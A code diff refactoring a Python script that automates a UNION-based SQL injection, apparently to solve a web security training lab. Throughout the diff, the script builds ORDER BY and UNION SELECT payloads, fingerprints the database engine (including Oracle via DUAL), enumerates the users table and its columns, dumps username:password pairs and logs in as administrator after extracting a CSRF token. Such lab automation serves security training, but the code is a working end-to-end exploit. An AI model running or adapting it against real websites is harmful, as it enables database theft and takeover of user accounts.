@@ -3,8 +3,9 @@ import warnings
 from typing import List, Optional
 from urllib.parse import urljoin
 
-import requests
 from bs4 import BeautifulSoup
+from requests import RequestException, Response
+from requests.sessions import Session
 
 warnings.filterwarnings("ignore", message="Unverified HTTPS")
 
@@ -12,7 +13,7 @@ warnings.filterwarnings("ignore", message="Unverified HTTPS")
 class LabExploit:
     def __init__(self, base_url: str) -> None:
         self.base_url = base_url.rstrip("/")
-        self.session = requests.Session()
+        self.session = Session()
         self.session.headers.update(
             {"User-Agent": "Security-Scanner-v1", "Connection": "close"}
         )
@@ -22,14 +23,15 @@ class LabExploit:
         }
         self.db_engine = "generic"
         self.is_oracle = False
+        self.category = "Gifts"
 
-    def send_request(
+    def _send_request(
         self,
         endpoint: str,
         params: Optional[dict] = None,
         data: Optional[dict] = None,
         method: str = "GET",
-    ) -> Optional[requests.Response]:
+    ) -> Optional[Response]:
         """Hanldes all low-level HTTP communication"""
         target_url = urljoin(self.base_url, endpoint)
         try:
@@ -43,20 +45,19 @@ class LabExploit:
                 proxies=self.proxies,
                 verify=False,
             )
-        except requests.RequestException as e:
-            print(f"[-] Connection error: {e}")
+        except RequestException:
             return None
 
-    def validated_request(
+    def _validated_request(
         self,
         endpoint: str,
         params: Optional[dict] = None,
         data: Optional[dict] = None,
         method: str = "GET",
         stage: str = "unknown",
-    ) -> requests.Response:
+    ) -> Response:
         """Wrapper gracefully exits in unexpected error"""
-        res = self.send_request(endpoint, params, data, method)
+        res = self._send_request(endpoint, params, data, method)
         if res is None:
             print(f"[-] State [{stage}]: Connection error")
             sys.exit(1)
@@ -68,12 +69,12 @@ class LabExploit:
 
     def is_alive(self) -> bool:
         print("[*] Phase 1: Checking if URL is alive...")
-        res = self.send_request("")
-        return res is not None and "academyLabHeader" in res.text
+        res = self._validated_request("", stage="recon-user-check")
+        return "academyLabBanner" in res.text
 
     def harvest_category(self) -> Optional[str]:
         print("[*] Phase 2: Harvesting valid filter categories...")
-        res = self.validated_request("", stage="recon")
+        res = self._validated_request("", stage="recon-harvest-category")
         soup = BeautifulSoup(res.text, "html.parser")
         categories = []
         for tag in soup.find_all("a", class_="filter-category"):
@@ -82,22 +83,22 @@ class LabExploit:
                 categories.append(name)
         return min(categories, key=len) if categories else None
 
-    def find_column_count(self, category: str) -> int:
-        print("[*] Phase 3: Determining column count...")
+    def get_table_width(self) -> int:
+        print("[*] Phase 3: Determining table width...")
 
         for i in range(1, 11):
-            payload = f"{category}' ORDER BY {i} -- "
-            res = self.send_request("filter", params={"category": payload})
+            payload = f"{self.category}' ORDER BY {i} -- "
+            res = self._send_request("filter", params={"category": payload})
             if res is not None and res.status_code != 200:
                 return i - 1
         return 0
 
-    def find_string_column(self, category: str, count: int) -> List[int]:
+    def map_string_indices(self, col_count: int) -> List[int]:
         print("[*] Phase 4: Mapping string-compatible columns & detecting Oracle...")
         # Oracle detection
-        nulls = ["NULL"] * count
-        payload = f"{category}' UNION SELECT {','.join(nulls)} FROM DUAL -- "
-        oracle_test = self.send_request("filter", params={"category": payload})
+        nulls = ["NULL"] * col_count
+        payload = f"{self.category}' UNION SELECT {','.join(nulls)} FROM DUAL -- "
+        oracle_test = self._send_request("filter", params={"category": payload})
         if oracle_test is not None and oracle_test.status_code == 200:
             self.is_oracle = True
             self.db_engine = "oracle"
@@ -105,11 +106,11 @@ class LabExploit:
         # Map string-compatible columns
         indices = []
         suffix = "FROM DUAL" if self.db_engine == "oracle" else ""
-        for i in range(count):
-            cols = ["NULL"] * count
+        for i in range(col_count):
+            cols = ["NULL"] * col_count
             cols[i] = "'asif_probe'"
-            payload = f"{category}' UNION SELECT {','.join(cols)} {suffix} -- "
-            res = self.send_request("filter", params={"category": payload})
+            payload = f"{self.category}' UNION SELECT {','.join(cols)} {suffix} -- "
+            res = self._send_request("filter", params={"category": payload})
             if res is not None and "asif_probe" in res.text:
                 indices.append(i)
         return indices
@@ -127,7 +128,7 @@ class LabExploit:
             headers.append(th.get_text(strip=True))
         return headers
 
-    def detect_db_engine(self, category: str, count: int, indices: List[int]) -> bool:
+    def detect_db_engine(self, count: int, indices: List[int]) -> bool:
         print("[*] Phase 5: Fingerprinting Database Engine...")
 
         probes = {
@@ -140,8 +141,8 @@ class LabExploit:
             cols = ["NULL"] * count
             cols[indices[0]] = func
             suffix = "FROM DUAL" if engine == "oracle" else ""
-            payload = f"{category}' UNION SELECT {','.join(cols)} {suffix} -- "
-            res = self.send_request("filter", params={"category": payload})
+            payload = f"{self.category}' UNION SELECT {','.join(cols)} {suffix} -- "
+            res = self._send_request("filter", params={"category": payload})
             if res and res.status_code == 200:
                 self.db_engine = engine
                 print(f"[+] Database Engine confirmed: {engine.upper()}")
@@ -150,8 +151,8 @@ class LabExploit:
                 return True
         return False
 
-    def dump_credentials(
-        self, category: str, col_count: int, col_indices: List[int]
+    def exfiltrate_and_parse_creds(
+        self, col_count: int, col_indices: List[int]
     ) -> dict[str, str]:
         print("[*] Phase 6: Dumping Schema & Credentials...")
         # Determine table and column registry information
@@ -161,15 +162,15 @@ class LabExploit:
         # 1. Extract User Table
         cols = ["NULL"] * col_count
         cols[col_indices[0]] = "table_name"
-        payload = f"{category}' UNION SELECT {','.join(cols)} FROM {table_reg} -- "
-        res = self.validated_request(
+        payload = f"{self.category}' UNION SELECT {','.join(cols)} FROM {table_reg} -- "
+        res = self._validated_request(
             "filter", params={"category": payload}, stage="table_dump"
         )
         tables = self.extract_data(res.text)
         user_table = next((t for t in tables if "users" in t.lower()), None)
 
         if not user_table:
-            print("[-] Error: Could not find user tavle")
+            print("[-] Error: Could not find user table")
             sys.exit(1)
         print(f"[+] identified user table: {user_table}")
 
@@ -178,10 +179,8 @@ class LabExploit:
         where_clause = (
             f"WHERE table_name='{user_table.upper() if self.is_oracle else user_table}'"
         )
-        payload = (
-            f"{category}' UNION SELECT {','.join(cols)} FROM {col_reg} {where_clause} -- "
-        )
-        res = self.validated_request(
+        payload = f"{self.category}' UNION SELECT {','.join(cols)} FROM {col_reg} {where_clause} -- "
+        res = self._validated_request(
             "filter", params={"category": payload}, stage="column_name"
         )
         columns = self.extract_data(res.text)
@@ -194,8 +193,10 @@ class LabExploit:
 
         # 3. Extract Credentials
         cols[col_indices[0]] = f"{u_col} || ':' || {p_col}"
-        payload = f"{category}' UNION SELECT {','.join(cols)} FROM {user_table} -- "
-        res = self.validated_request(
+        payload = (
+            f"{self.category}' UNION SELECT {','.join(cols)} FROM {user_table} -- "
+        )
+        res = self._validated_request(
             "filter", params={"category": payload}, stage="creds_dump"
         )
         raw_creds = self.extract_data(res.text)
@@ -210,23 +211,14 @@ class LabExploit:
             creds_dict[u.strip()] = p.strip()
         return creds_dict
 
-    def extract_crsf_token(self, html_content: str) -> str:
-        csrf_token = ""
-        soup = BeautifulSoup(html_content, "html.parser")
+    def authenticate_and_verify(self, username: str, password: str) -> bool:
+        print(f"[*] Phase 7: Attempting to login as {username}...")
 
+        # Step 1. Load login page and extract CSRF token
+        res = self._validated_request("login", stage="load-login-page")
+        soup = BeautifulSoup(res.text, "html.parser")
         csrf_tag = soup.find("input", attrs={"name": "csrf"})
-        if csrf_tag:
-            csrf_token = str(csrf_tag.get("value", ""))
-        return csrf_token
-
-    def login_as_admin(self, admin_pass: str) -> bool:
-        print(
-            f"[*] Phase 7: Attempting login for 'administrator' with password: {admin_pass}..."
-        )
-
-        # 1. Load login page and extract CSRF token
-        res = self.validated_request("login", stage="login_page_load")
-        csrf_token = self.extract_crsf_token(res.text)
+        csrf_token = str(csrf_tag.get("value")) if csrf_tag else None
 
         if not csrf_token:
             print("[-] Error: Could not find CSRF token in login page")
@@ -234,15 +226,18 @@ class LabExploit:
 
         print(f"[+] Extracted CSRF Token: {csrf_token}")
 
+        # Step 2: Attempt login
         login_data = {
             "csrf": csrf_token,
-            "username": "administrator",
-            "password": admin_pass,
+            "username": username,
+            "password": password,
         }
-        res = self.send_request("login", data=login_data, method="POST")
+        self._validated_request(
+            "login", data=login_data, method="POST", stage=f"login-{username}"
+        )
 
         # Check Final State
-        res = self.send_request("")
+        res = self._validated_request("", stage="validate-solve")
         if res is not None and "Congratulation" in res.text:
             return True
         return False
@@ -256,39 +251,41 @@ class LabExploit:
         # Extract categories
         category = self.harvest_category()
         if not category:
-            print("[-] Could not find a valid category.")
+            print("[-] Could not find a valid category!")
             return
-        print(f"[+] Target category identified: {category}.")
+        self.category = category
+        print(f"[+] Target category identified: {category}")
 
         # Determine column count
-        col_count = self.find_column_count(category)
+        col_count = self.get_table_width()
         if col_count == 0:
-            print("[-] Could not determine column count.")
+            print("[-] Could not determine table width!")
             return
-        print(f"[+] Column count: {col_count}.")
+        print(f"[+] Table width: {col_count}")
 
         # Map string-compatible column
-        col_indices = self.find_string_column(category, col_count)
+        col_indices = self.map_string_indices(col_count)
         if not col_indices:
             print("[-] Need atleast one string-compatible column!")
             return
 
         # Fingerprint DB Engine
-        engine = self.detect_db_engine(category, col_count, col_indices)
+        engine = self.detect_db_engine(col_count, col_indices)
         if not engine:
             print("[-] Could not fingerprint DB!")
             return
 
         # Dump DB and extract administrator creds
-        creds = self.dump_credentials(category, col_count, col_indices)
+        creds = self.exfiltrate_and_parse_creds(col_count, col_indices)
         if not creds:
-            print("[-] Could not dump administrator credentials")
+            print("[-] Could not exfiltrate credentials!")
             return
 
-        if self.login_as_admin(creds["administrator"]):
-            print("[!] SUCCESS: Lab Solved!")
+        # Attempt login and verify
+        if self.authenticate_and_verify("administrator", creds["administrator"]):
+            print("[!] SUCCESS: Logged in and Lab Solved!")
         else:
-            print("[-] Lab failed!")
+            print("[-] Lab is not solved!")
 
 
 def main():
